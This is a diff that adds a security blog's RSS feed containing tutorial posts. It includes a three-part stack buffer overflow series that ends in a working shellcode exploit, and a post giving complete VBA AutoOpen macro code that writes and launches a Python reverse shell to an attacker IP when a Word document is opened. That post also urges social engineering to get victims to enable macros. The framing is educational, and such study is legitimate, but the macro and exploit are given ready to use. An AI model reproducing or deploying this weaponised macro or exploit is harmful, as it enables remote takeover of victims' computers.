@@ -1,0 +1,869 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on For the curious ones</title>
+        <link>https://scr1p7k1dd13.github.io/posts/</link>
+        <description>Recent content in Posts on For the curious ones</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <copyright>&lt;a href=&#34;#&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;V 1.2&lt;/a&gt;</copyright>
+        <lastBuildDate>Tue, 10 Aug 2021 14:33:37 +0530</lastBuildDate>
+        <atom:link href="https://scr1p7k1dd13.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>The Missing Bits:Part 1</title>
+            <link>https://scr1p7k1dd13.github.io/posts/2021/08/the-missing-bitspart-1/</link>
+            <pubDate>Tue, 10 Aug 2021 14:33:37 +0530</pubDate>
+            
+            <guid>https://scr1p7k1dd13.github.io/posts/2021/08/the-missing-bitspart-1/</guid>
+            <description>I remember my college days, the good old days. The time we spend with friends. The most troublesome part of it was the exam. when I try to remember the answer to a question all I can remember was English songs. I never questioned that behavior, maybe because I love songs or maybe even if I try I won&amp;rsquo;t be able to find an answer. Now when I recall those moments I can tell you one thing for sure, my brain cells holding question answers were overwritten by song lyrics.</description>
+            <content type="html"><![CDATA[<p><img src="/images/post9.jpg" alt="image"></p>
+<p>I remember my college days, the good old days. The time we spend with friends. The most troublesome part of it was the exam. when I try to remember the answer to a question all I can remember was English songs. I never questioned that behavior, maybe because I love songs or maybe even if I try I won&rsquo;t be able to find an answer. Now when I recall those moments I can tell you one thing for sure, my brain cells holding question answers were overwritten by song lyrics. I can&rsquo;t complain because I tried to fit so many things in a limited space. The same applies to computer memory also. When we try to fit <code>x+y</code> amounts of data in <code>x</code>amount of space, it overflows. Resulting in adjacent memory regions being overwritten by unwanted data. Some tried to fix this behavior while some tried to exploit it. As a result, a new class of vulnerability was born the <strong><em>Buffer overflow</em></strong>.</p>
+<p>It is destructive yet beautiful at the same time, a true art. Hackers have a sweet spot for buffer overflows because of its destructive nature. In this series i will guide you through how these vulnerabilities arise and how to exploit them.</p>
+<h3 id="basics">Basics</h3>
+<p>We must learn the basics before trying to do something more advanced. Understanding buffer overflow means understanding Architecture, Addressing, and Memory layout.</p>
+<ul>
+<li>Architecture</li>
+</ul>
+<p>Architecture is all about the design, here we are concerned about CPU design. You might&rsquo;ve already heard about x86 and x64 architectures. The processor design determines what software can run on the computer and what other hardware components are supported.</p>
+<ul>
+<li>Addressing</li>
+</ul>
+<p>It is similar to our home address, a way to find something. Memory addresses are references to a memory location represented in hex. Since we are dealing with a 64-bit machine each memory address will be 64 bit long(8-byte long) and the system can represent 2⁶⁴ distinct memory addresses.</p>
+<blockquote>
+<p>sample 64 bit memory address:<code>0x7fffffffec50</code></p>
+</blockquote>
+<p>but there is a catch, just because an architecture uses 64-bit pointers, doesn&rsquo;t mean that all the bits of those pointers are actually used. <a href="https://en.wikipedia.org/wiki/X86-64#Virtual_address_space_details">Its because the current implementations do not allow the entire virtual address space of 2⁶⁴  bytes (16 EB) to be used</a>. So even though memory addresses are 64 bits long, the userspace is restricted to the first 48 bits. Keep this in mind because if you specified an address greater than <code>0x00007fffffffffff</code> , you&rsquo;ll raise an exception.</p>
+<ul>
+<li>Memory layout</li>
+</ul>
+<p>Memory is the place where all our data are getting stored. When a process gets loaded into memory a certain amount of memory is allocated to that process in an organized manner. Known as the memory layout of the process.</p>
+
+    <img src="https://cdn-images-1.medium.com/max/800/1*Lq19br8KmChomoE9HUgsqQ.png"  alt="Hello Friend"  class="center"  />
+
+
+<p><code>stack</code> : Stack is where all the local variables are stored(function local variables). It works on LIFO(last-in-fist-out) order and grows downwards(higher memory to lower memory address). A stack frame is created for that function containing all the local variables for that particular function when a function occurs. It is called a <strong>PUSH</strong> operation. When the function returns the stack frame is removed through the <strong>POP</strong> operation. </p>
+<p><code>Heap</code> : Heap is accountable for dynamic memory allocations(Eg; malloc()). </p>
+<p><code>BSS</code> : BSS stands for &lsquo;Block Started by Symbol&rsquo;. It contains all global and static variables that are initialized to zero or do not have explicit initialization in the source code.</p>
+<p><code>DATA</code> : It contains both static and global data that are initialized with non-zero values.</p>
+<p><code>TEXT</code> : Text segment contains executable instructions of your program, it&rsquo;s also called code segment. </p>
+<p>Since we are about to explore stack-based buffer overflow our utmost concern is the stack region. We need to understand what is going on in the stack and the use of registers during process execution.</p>
+<p><a href="https://scr1p7k1dd13.github.io/posts/2021/08/the-missing-bitspart-2/">Continue reading</a>  →</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>The Missing Bits:Part 2</title>
+            <link>https://scr1p7k1dd13.github.io/posts/2021/08/the-missing-bitspart-2/</link>
+            <pubDate>Tue, 10 Aug 2021 13:34:28 +0530</pubDate>
+            
+            <guid>https://scr1p7k1dd13.github.io/posts/2021/08/the-missing-bitspart-2/</guid>
+            <description>We now know the basics but that&amp;rsquo;s not enough we&amp;rsquo;ve to dig a little deeper. Data is being pushed and popped out of the stack as a program executes. But have you ever wondered how the system keeps track of this execution? That&amp;rsquo;s when registers come into play. Registers are small memory units in the CPU capable of holding a small amount of data (memory addresses). As a program execute these registers instruct the system what to execute next and where to return after a function terminates.</description>
+            <content type="html"><![CDATA[<p>We now know the basics but that&rsquo;s not enough we&rsquo;ve to dig a little deeper. Data is being pushed and popped out of the stack as a program executes. But have you ever wondered how the system keeps track of this execution?  That&rsquo;s when registers come into play. Registers are small memory units in the CPU capable of holding a small amount of data (memory addresses). As a program execute these registers instruct the system what to execute next and where to return after a function terminates. There are different  classes of registers, but we will be considering <code>rbp</code> ,<code>rsp</code> and <code>rip</code> registers.</p>
+<ul>
+<li><code>rbp</code> (base pointer)is the base pointer, which points to the base of the current stack frame</li>
+<li><code>rsp</code> (stack pointer) always points to the top of the stack, which will change any time a word or address is pushed or popped onto/off of the stack.</li>
+<li><code>rip</code> (Instruction pointer) is the register that tells the system where to go next to execute the next command. It controls the flow of execution.</li>
+</ul>
+<p>All these terms can be a little confusing. But believe me, things will get much easier as we proceed.</p>
+<h3 id="the-stack">The stack</h3>
+<p>Let&rsquo;s try to understand what is happening in the stack with the help of a C program,</p>
+
+    <img src="https://cdn-images-1.medium.com/max/800/1*HMVie3AMAoVXh-xgfqZvuQ.png"  alt="Hello Friend"  class="center"  />
+
+
+<ul>
+<li>The main function will start first, the variable x will be pushed into the stack, and it will print out the sentence &ldquo;Inside main function&rdquo;,</li>
+</ul>
+
+    <img src="https://cdn-images-1.medium.com/max/800/1*1ZYGLGTKtHWwXeh-erOSbQ.png"  alt="Hello Friend"  class="center"  />
+
+
+<ul>
+<li>The main function will then call function1 and before moving forward to function1, the address of printf(&ldquo;function1 terminated&rdquo;) will be saved into the stack to continue the execution flow. Now control will move forward to execute function1 by pushing the variable y into the stack and then execute printf(&ldquo;Inside function1\n&rdquo;), as shown in the following diagram:</li>
+</ul>
+
+    <img src="https://cdn-images-1.medium.com/max/800/1*OAEd-9SoEh97a6JFX7YdhA.png"  alt="Hello Friend"  class="center"  />
+
+
+<ul>
+<li>After executing printf(&ldquo;Inside function1\n&rdquo;) funtion1 will exit, removing the function&rsquo;s stack frame. Then, go back to the main function to execute printf(&quot; function1 terminated&quot;) and exit. Resulting in successful execution.</li>
+</ul>
+<h3 id="registers">Registers</h3>
+
+    <img src="https://cdn-images-1.medium.com/max/800/1*cVA0R8svDIIlsof75-6oCw.png"  alt="Hello Friend"  class="center"  />
+
+
+<p>At the beginning of execution the registers <code>rbp</code> and <code>rsp</code> are initialized.rbp remaining unchanged the <code>rsp</code> changes rapidly as PUSH and POP operations take place.rip contains the address of the instruction following the <strong>CALL</strong> instruction. That is, <code>rip</code> decide what to execute next. During program executions <code>rip</code> value is determined by the system. But what if we could control <code>rip</code> and make the system execute something we desire?
+That is exactly what we will achieve using a buffer overflow attack. We will take control of <code>rip</code> and make it point to a different location containing malicious code.</p>
+<h3 id="environment-setup">Environment setup</h3>
+<p>Before proceeding any further let&rsquo;s take a little peek into the environment setup. Buffer overflow is a memory exploit, so we need to understand what is going on in memory. We will be using <strong>GDB</strong> for debugging purposes along with <strong>peda.py</strong>, a plugin for the debugger. We will use <strong>execstack</strong> to make the stack executable.</p>
+<h3 id="installation">Installation</h3>
+<blockquote>
+<p>Assumption :  you are using Linux system</p>
+</blockquote>
+<ul>
+<li><strong>GDB</strong></li>
+</ul>
+<pre><code>
+sudo apt-get update
+sudo apt-get install gdb
+
+Basic GDB commands
+------------------------------------------------------------------------------
+break(b) : Used to set breakpoints in the program.
+continue(c) : Resume execution
+disassemble(disas) : Used to disassemble a function.
+help(h) : List of classes of commands
+info registers(i r) : Displays the current contents of the CPU registers.
+list(l) : To print lines from a source file. By default, ten lines are printed
+run(r) : Used to run the program under gdb.
+
+</code></pre><ul>
+<li><strong>peda</strong></li>
+</ul>
+<pre><code>git clone https://github.com/longld/peda.git ~/peda
+echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit
+</code></pre><ul>
+<li><strong>execstack</strong></li>
+</ul>
+<pre><code>sudo apt-get insatll execstack
+</code></pre><blockquote>
+<p>Note: Demo uses a Linux x86_64 (arch) ubuntu 16.04(OS) machine.</p>
+</blockquote>
+<p>that&rsquo;s it for part 2, see you in <a href="http://scr1p7k1dd13.github.io/posts/2021/08/the-missing-bitspart-3/">part 3</a> 😄</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>The Missing Bits:Part 3</title>
+            <link>https://scr1p7k1dd13.github.io/posts/2021/08/the-missing-bitspart-3/</link>
+            <pubDate>Tue, 10 Aug 2021 11:48:10 +0530</pubDate>
+            
+            <guid>https://scr1p7k1dd13.github.io/posts/2021/08/the-missing-bitspart-3/</guid>
+            <description>Buckle up, things are about to get serious now. Consider this as a real-world CTF where the machine is intentionally made vulnerable. Similarly, we will make a vulnerable C program and compile it by disabling all stack protection mechanisms. The compiler and OS will protect the system from such attacks by enabling protection mechanisms such as ASLR&amp;amp;NX .
+ ASLRrandomizes the location where system executables are loaded into memory. Making it difficult to guess memory address.</description>
+            <content type="html"><![CDATA[<p>Buckle up, things are about to get serious now. Consider this as a real-world CTF where the machine is intentionally made vulnerable. Similarly, we will make a vulnerable C program and compile it by disabling all stack protection mechanisms. The compiler and OS will protect the system from such attacks by enabling protection mechanisms such as <code>ASLR</code>&amp;<code>NX</code> .</p>
+<ul>
+<li>ASLRrandomizes the location where system executables are loaded into memory. Making it difficult to guess memory address.</li>
+<li><code>NX</code> used to prevent shellcode execution. Memory regions are marked as non-executable using the NX bit.</li>
+</ul>
+<h3 id="the-program">The Program</h3>
+
+    <img src="https://cdn-images-1.medium.com/max/800/1*9q9viqnyOa6NeUjLoUWseg.png"  alt="Hello Friend"  class="center"  />
+
+
+<p>It&rsquo;s a simple C program that takes user input and stores it in a buffer. The buffer is a temporary space with the size of char, which can hold up to 256 bytes(but the input is limited to 255 bytes as the array in c is terminated with &ldquo;\0&rdquo;). The program does not perform any bound check meaning the input length is not restricted.</p>
+<ul>
+<li><strong>When expected input is provided(&lt;256 bytes)</strong></li>
+</ul>
+<p><img src="https://cdn-images-1.medium.com/max/800/1*sAHKSAYQpQLp0nRPakoeMg.png" alt="image"></p>
+<p>Buffer gets initialized, prints the content, and exits normally.</p>
+<ul>
+<li><strong>When large input is given(&gt;256 bytes)</strong></li>
+</ul>
+<p><img src="https://cdn-images-1.medium.com/max/800/1*IWm82hCyJZXzcl59JCwvag.png" alt="image"></p>
+<p>It inputs 300 A&rsquo;s to the program and as expected the program crashes by outputting &ldquo;<em>stack smashing detected</em>&quot;. </p>
+<p>Why this error? we know we are not allowed to input this much data but still, things don&rsquo;t make sense 😕. Let&rsquo;s see what happens in both buffer and stack under these circumstances.</p>
+<p><img src="https://cdn-images-1.medium.com/max/800/1*CLKQ46xrpmdFCdwpjxa-2w.png" alt="image"></p>
+<p>In the picture on the left, the buffer is filled with data less than the buffer size, and the program exits without error. But in the right, the user&rsquo;s input overflowed the allocated buffer, thus filling the old base pointer and return address. The return address controls the execution flow and in this case, the return address was overwritten by A&rsquo;s. Causing the error.</p>
+<h3 id="disabling-protection">Disabling protection</h3>
+<p>Before proceeding any further let&rsquo;s disable <code>ASLR</code> . Enter <code>sudo echo 0 &gt; /proc/sys/kernel/randomize_va_space</code> . This will temporarily disable memory randomization.</p>
+<p>Now re-compile the C program:</p>
+<p><code>gcc -g -fno-stack-protector -z execstack -no-pie vuln.c -o vuln</code></p>
+<ul>
+<li><code>-g</code> uses global debug symbols.</li>
+<li><code>-fno-stack-protector</code> removes stack protection for the executable. </li>
+<li><code>-z</code> execstack to enable stack execution. </li>
+<li><code>-o</code> output file for our binary.</li>
+</ul>
+<p>run the output to check if the stack protection is disabled.</p>
+<p><img src="https://cdn-images-1.medium.com/max/800/1*IOuvgFRHXPo__NhHiss8AQ.png" alt="image"></p>
+<p>the old &ldquo;<em>stack smashing error</em> &quot; is now disappeared confirming the stack protection has been disabled. Remember our aim is to overflow the buffer and take control of <code>rip</code>.</p>
+<blockquote>
+<p><em>Tip: You could check the status of security controls by issuing the command &ldquo;checksec&rdquo; in gdb-peda</em> 
+<img src="https://cdn-images-1.medium.com/max/800/1*X5C3DvYVh71uWntKkqetew.png" alt="image"></p>
+</blockquote>
+<h3 id="controlling-rip">Controlling RIP</h3>
+<p>Use gdb to debug the program:</p>
+<p><code>gdb ./vuln -q</code>  </p>
+<p>use <code>run</code> command to execute the program under gdb:</p>
+<p><img src="https://cdn-images-1.medium.com/max/800/1*ccw50tJEvOYAe72FdbaoRg.png" alt="image"></p>
+<p>As expected <code>rbp</code> got overwritten and now pointing to <code>0x4141414141414141</code>(where 41 is the hex of ASCII A). But still, we are unable to control <code>rip</code> . To overwrite <code>rip</code> we must know the length of input that will correctly overwrite <code>rip</code> . How do we calculate the offset or the exact number of bytes in the input which will cause <code>rip</code> overwrite? One way is to try varying length input and figure out the input which causes <code>rip</code>change. Another way is using the &ldquo;peda patterns&rdquo;. Patterns are random strings generated by gdb-peda, used to calculate the offsets at which the registers started getting overwritten.</p>
+<p><img src="https://cdn-images-1.medium.com/max/800/1*lbkUqqEh5ul3K5QvJtbH3w.png" alt="image"></p>
+<p><code>pattern_create 300</code> pattern will create a pattern with length 300 and save it to a file name pattern. Then all we have to do is to input the pattern into the program. Use the command <code>pattern_search</code> to find the offset.</p>
+<p><img src="https://cdn-images-1.medium.com/max/800/1*K0cVC7ZGBM99qScaVZzo0A.png" alt="image"></p>
+<p><code>[RSP] → offset 264</code> indicates that the register <code>rsp</code> was overwritten after 264 bytes. Meaning the <code>rip</code> value will be determined by the upcoming 6 bytes. So our input becomes:</p>
+
+    <img src="https://cdn-images-1.medium.com/max/800/1*XsyvhHHTp4_52khChMWaJA.png"  alt="Hello Friend"  class="center"  />
+
+
+<p>Let&rsquo;s test this theory out:</p>
+<p><img src="https://cdn-images-1.medium.com/max/800/1*NC0WcdBK-kiI32yRvSNaxQ.png" alt="image"></p>
+<p>As expected <code>rip</code> got overwritten with 42&rsquo;s(where 42 is the hex of ASCII B). We finally control rip 😍.</p>
+<h3 id="executing-shellcode">Executing shellcode</h3>
+<p>We will use the buffer to store our shellcode and use <code>rip</code> to point to the buffer. We will sandwich our shellcode with No Operations (NOPs). So when instructions are loaded into the registers, they are loaded in appropriate chunks. When the Jump to ESP is called the code slides down from the top to the actual shellcode.</p>
+
+    <img src="https://cdn-images-1.medium.com/max/800/1*iu4Gl36IXeToXOtpsDt1Xw.png"  alt="Hello Friend"  class="center"  />
+
+
+<p>We will be using a shellcode that read the content of <code>/etc/passwd</code> (82-byte long).</p>
+<pre><code>shellcode:\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41
+
+</code></pre><p>We already know that our input has to be 270 bytes (264+6) long to completely overwrite <code>rip</code> . So it is up to us to decide how to divide the input, we already know the length of two inputs (6-byte memory address and 82-byte shellcode).</p>
+<p><code>input = nops + shellcode + offset + address</code></p>
+<p>For my convenience, I will divide the input as:</p>
+<p><code>input [270 bytes] = nops [150 bytes]+ shellcode [82 bytes]+ offset[32 bytes] + address [6 bytes]</code></p>
+<p>so far so good. Let&rsquo;s work out this theory of ours:</p>
+<p><img src="https://cdn-images-1.medium.com/max/800/1*hjX8bGH-y2SVAlF3J2bHTw.png" alt="image"></p>
+<p>looks good. The only thing remaining is to replace the B&rsquo;s with an actual memory address. For that, we will analyze the memory using the command <code>x/200x $rsp</code> .</p>
+<p><img src="https://cdn-images-1.medium.com/max/800/1*fqdbqNLQ_j7V4q-eK-1RYg.png" alt="image"></p>
+<p>the region between <code>0x7fffffffe770</code> to <code>0x7fffffffe830</code> has been filled with our NOP(<code>\x90</code>) instruction. So, if we make <code>rip</code> to point to an address between these areas, the NOP slide will occur and the shellcode that comes after it will be executed. But there is a catch, we can&rsquo;t represent the address as it is. This is because our system is <a href="https://en.wikipedia.org/wiki/Endianness">little-endian</a>. So we&rsquo;ll have to give our input in reverse order to get correctly interpreted by the system(Eg; <code>cat -&gt; tac</code>). Considering all these factors our input will become,</p>
+<pre><code>input [270 bytes] = \x90 * 150 + \xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41 + A * 32+ \x90\xe7\xff\xff\xff\x7f [randomly chosen]
+</code></pre><p>once in gdb run:</p>
+<pre><code>gdb-peda$ run  $(python -c 'print &quot;\x90&quot; * 150 + &quot;\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41&quot; + &quot;A&quot; * 32+ &quot;\x90\xe7\xff\xff\xff\x7f&quot;')
+</code></pre><p>which will overwrite the <code>rip</code> with the value <code>0x7fffffffe790</code> and make the system point to the user-controlled buffer, eventually executing the shellcode placed in it.</p>
+<p><img src="https://cdn-images-1.medium.com/max/800/1*BoBFgddm22Y5DiYzPW4egA.png" alt="image"></p>
+<p>Thanks for reading, I hope you found this interesting 😄</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>The Silent Shell</title>
+            <link>https://scr1p7k1dd13.github.io/posts/2021/04/the-silent-shell/</link>
+            <pubDate>Thu, 29 Apr 2021 12:35:34 +0530</pubDate>
+            
+            <guid>https://scr1p7k1dd13.github.io/posts/2021/04/the-silent-shell/</guid>
+            <description>We live in a world where everything is connected through the internet. Something that is considered as a blessing and a curse at the same time. Almost everyone from developers to students uses the internet every day, but they are not the only ones using the internet, some people use the internet for personal or financial gain, people who work while the world sleeps, people who are constantly looking for security issues for exploitation, the “Hackers”.</description>
+            <content type="html"><![CDATA[<p><img src="/images/post8.jpg" alt="image"></p>
+<p>We live in a world where everything is connected through the internet. Something that is considered as a blessing and a curse at the same time. Almost everyone from developers to students uses the internet every day, but they are not the only ones using the internet, some people use the internet for personal or financial gain, people who work while the world sleeps, people who are constantly looking for security issues for exploitation, the “Hackers”. The hackers we know are those who exploit security issues or vulnerabilities in an existing system. But what if I told you that hackers are also exploiting application features to get a foothold to your network. It can be confusing how an application feature can adversely affect a person because it is designed for one purpose. But in a hacker&rsquo;s eyes, it does not matter if it is an object or a feature, it is defined by the way it is used. Similarly, there are some application features that an attacker can take advantage of to hack into your system. Today, we will look at one such feature in MS Word/Excel that hackers exploit widely.</p>
+<h3 id="the-mystery-note">The Mystery Note</h3>
+<p>I was shocked when I saw a post about the latest attack on how a group of hackers gained control of a network by opening a Word document. After reading the article I did a little research to see what would happen if I opened a malicious word document and I ended up having a shell on my system. In this article, I will guide you on how I was able to get a reverse shell on a system by opening a macro-enabled Word document, so cooperate with me as I explain, because I want you to know every detail of it.</p>
+<h3 id="the-feature">The Feature</h3>
+<p>The feature we are going to discuss is none other than Macros. Ones that were designed to automate simple tasks inside the application. Macros are capable of automating your workflow once you’re inside the application. They helped make the everyday office worker’s job a little easier, but they also opened up a juicy attack surface. We will be considering Microsoft word as our application of choice. In MS Word under view, there are options to either record or create a custom macro using <a href="https://docs.microsoft.com/en-us/office/vba/library-reference/concepts/getting-started-with-vba-in-office">VBA</a>.</p>
+<p><img src="/images/macro_option.png" alt="image"></p>
+<p>If you select the Record option, you can record the actions you performed while working on the application, and if you choose to create one, you can write your own code to guide the application on what to do. And this is where the problem begins, If you can code and dictate what the app should do, you have the power to do anything within the app’s capabilities.</p>
+<h3 id="creating-the-document">Creating the document</h3>
+<p>Every attack needs an attacker and a victim. As usual, an attacker is a person with malicious intent and in this case, the attacker is the person who will be creating the malicious word document. So whatever we discuss under this section will be in favor of the attacker or what the attacker wants to achieve and how he achieves it.</p>
+<blockquote>
+<p><strong><em><strong>Assumption: Our victim is a developer with python installed in the system.</strong></em></strong></p>
+</blockquote>
+<p>Why python? Why not a universal method to exploit? you might be having all these doubts and am pretty sure as we go on explaining you’ll get an idea of why we need it.</p>
+<p>To create a macro navigate to View → Macros →View Macros.</p>
+<p><img src="/images/Macro_open.png" alt="image"></p>
+<p>Set the Macro name to AutoOpen which will direct the application to automatically execute the embedded macro once you’ve opened the document and under the Macro in drop-down select the current document name(Bottom one in the drop-down). Click on create which will open the VBA editor and this is where we will write the code.</p>
+<p><img src="/images/vbaIde.png" alt="image"></p>
+<h3 id="the-logic">The Logic</h3>
+<p>Now that we have all the initial setup it is time to write the code. We’ll be using python to create the payload and will try embedding it in VBA. I didn&rsquo;t choose easy approaches like having a reverse TCP connection with Netcat or PowerShell script because windows security is highly restrictive. You won&rsquo;t be able to download certain programs or implement certain functions in VBA when windows security is active. If the code inside the macro is found to be malicious then that code will not work. For my viewers, I always want to deliver something that works anyway. Since our victim has python installed in his system we will generate a reverse shell using python and try calling it from our macro. What we need is a persistent connection, not the one that times out quickly after opening the document. The shell should be terminated only after the user explicitly interrupts the python shell. To achieve persistence, we must be able to locally store our python code in the victim&rsquo;s system and execute them from their local environment. But there are restrictions, when it comes to Office macros windows security will restrict you in implementing programs that try to download external files(Correct me if I am wrong 😅). So we can’t store the python program on an external server and download it to the system 😢. This was a real pain for me because for my Macro to work properly the payload(python code) must reside in the victim’s system. I had no one to question, and I could not ask God(Stackoverflow) because I was the only one using this method. Giving up was not an option, so I tried harder, as Elon said,</p>
+<p>“<em><strong>When something is important enough, you do it even if the odds are not in your favor</strong></em>”</p>
+<p>I finally found the solution I was looking for. The idea was to write a macro that will generate a python file locally and execute the same when it is run. Simple right, but trust me, there were more restrictions on the VBA. First of all, the Python script needs to be converted to a single liner, and when it comes to Python you know the classic indentation and syntax errors, so you need to be careful when converting the multiline program to a single line. Inserting your single-liner after troubleshooting will result in errors in VBA because VBA follows a specific structure, and everything built into it must follow the same structure.</p>
+<h3 id="the-malicious-code">The Malicious Code</h3>
+<p>An attack will succeed as long as the victim is not in doubt. Whatever we are trying to achieve we need to make sure that the victim has no doubts about it. So our code should be carefully crafted and should raise no run-time errors. Follow the steps explained in The Feature section to open the editor to code, First of all, let’s create a directory that stores our python script.</p>
+<pre><code>Dim oFSO
+Set oFSO = CreateObject(&quot;Scripting.FileSystemObject&quot;)
+If Not oFSO.FolderExists(&quot;c:\tmp&quot;) Then
+oFSO.CreateFolder &quot;C:\tmp&quot;
+End If
+</code></pre><p>This code will create a directory named <em><strong><em><strong>tmp</strong></em></strong></em> inside the <strong>C</strong> drive if it does not already exist. Now let&rsquo;s try to store the python program in that directory,</p>
+<pre><code>Dim fso As Object
+Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)
+Dim oFile As Object
+Set oFile = fso.CreateTextFile(&quot;C:\tmp\prs.py&quot;)
+Dim str As String
+Dim t As String
+t = &quot;&quot;&quot;&quot;
+str = &quot;exec(&quot; + t + &quot;import os,socket,subprocess,threading;\ndef s2p(s, p):\n    while True:\n        data = s.recv(1024)\n        if len(data) &gt; 0:\n            p.stdin.write(data)\n            p.stdin.flush()\n\ndef p2s(s, p):\n    while True:\n        s.send(p.stdout.read(1))\n\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('&lt;ip_address&gt;',4444))\n\np=subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)\n\ns2p_thread = threading.Thread(target=s2p, args=[s, p])\ns2p_thread.daemon = True\ns2p_thread.start()\n\np2s_thread = threading.Thread(target=p2s, args=[s, p])\np2s_thread.daemon = True\np2s_thread.start()\n\ntry:\n    p.wait()\nexcept KeyboardInterrupt:\n    s.close() &quot; + t + &quot;)&quot;
+oFile.WriteLine str
+oFile.Close
+</code></pre><p>This code will generate a file named prs.py inside our newly created directory i.e, inside <em><strong><em><strong>C:\tmp</strong></em></strong></em>. After creating the file, we will write the python one-liner stored inside the str variable to the prs.py file. And finally, after creating the file locally we will execute it by calling</p>
+<pre><code>Shell (&quot;python C:\tmp\prs.py&quot;)
+</code></pre><p>Let&rsquo;s combine the pieces to solve the puzzle</p>
+<pre><code>Dim oFSO
+Set oFSO = CreateObject(&quot;Scripting.FileSystemObject&quot;)
+If Not oFSO.FolderExists(&quot;c:\tmp&quot;) Then
+oFSO.CreateFolder &quot;C:\tmp&quot;
+End If
+Dim fso As Object
+Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)
+Dim oFile As Object
+Set oFile = fso.CreateTextFile(&quot;C:\tmp\prs.py&quot;)
+Dim str As String
+Dim t As String
+t = &quot;&quot;&quot;&quot;
+str = &quot;exec(&quot; + t + &quot;import os,socket,subprocess,threading;\ndef s2p(s, p):\n    while True:\n        data = s.recv(1024)\n        if len(data) &gt; 0:\n            p.stdin.write(data)\n            p.stdin.flush()\n\ndef p2s(s, p):\n    while True:\n        s.send(p.stdout.read(1))\n\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('&lt;ip_address&gt;',4444))\n\np=subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)\n\ns2p_thread = threading.Thread(target=s2p, args=[s, p])\ns2p_thread.daemon = True\ns2p_thread.start()\n\np2s_thread = threading.Thread(target=p2s, args=[s, p])\np2s_thread.daemon = True\np2s_thread.start()\n\ntry:\n    p.wait()\nexcept KeyboardInterrupt:\n    s.close() &quot; + t + &quot;)&quot;
+oFile.WriteLine str
+oFile.Close
+Shell (&quot;python C:\tmp\prs.py&quot;)
+</code></pre><p>This code when put inside a macro will do the job. First, it creates a directory and stores the program in that directory, and if Python is installed on the system, the program will run locally, eventually creating a reverse shell on the attacker’s machine. Save the code in the editor and save the document as a macro-enabled document.</p>
+<blockquote>
+<p><strong><em><strong>Note</strong></em></strong>: For the macro to run on a system the victim should allow its execution by clicking the <strong>Enable content</strong> button in the prompt window that pops up when the file is first opened. Making him click the button is upto your social engineering skills.</p>
+</blockquote>
+
+    <img src="/images/macr_warn.jpg"  alt="Hello Friend"  class="center"  />
+
+
+<h3 id="think-code-execute">Think, Code, Execute</h3>
+<p>Enough talking, Let’s see what happens when you open the macro-enabled document.</p>
+
+    <img src="/images/rshell.gif"  alt="Hello Friend"  class="center"  />
+
+
+<p>On the left, you can see the victim’s machine opening the document, and on the right, you can see the attacker’s terminal (black window) from where he gives commands.</p>
+<blockquote>
+<p><strong><em><strong>Note</strong></em></strong>: <em>This is not the only way to target macros. Attackers use frameworks such as <a href="https://github.com/BC-SECURITY">PowerShell Empire</a> to craft and distribute undetectable and harmful malware.</em></p>
+</blockquote>
+<h3 id="conclusion">Conclusion</h3>
+<p>Macro-enabled documents can lead to several attacks, including the installation of backdoor and malware. The best way to stay safe from such attacks is to turn them off(<em>Choose File, click Options, and click Trust Center. Click Trust Center Settings, choose the Macro Settings tab, click Disable All Macros Without Notification, and choose OK</em>) and not to open them at all.</p>
+<p>Never fall for such attacks 😄</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>The art of stealing passwords</title>
+            <link>https://scr1p7k1dd13.github.io/posts/2021/04/the-art-of-stealing-passwords/</link>
+            <pubDate>Tue, 13 Apr 2021 12:35:34 +0530</pubDate>
+            
+            <guid>https://scr1p7k1dd13.github.io/posts/2021/04/the-art-of-stealing-passwords/</guid>
+            <description>The world is going passwordless. Meaning no more memorized secrets instead they make use of “possession factors”, like OTP or software-based authenticators(Authy, Google authenticator). The password-based authentication is coming to an end and adopting new changes will always benefit the security culture. But will it really end?
+No, because it solely relies on the service providers and the user choices. If the website only provides password-based authentication methods then there is no other way but to remember the passwords.</description>
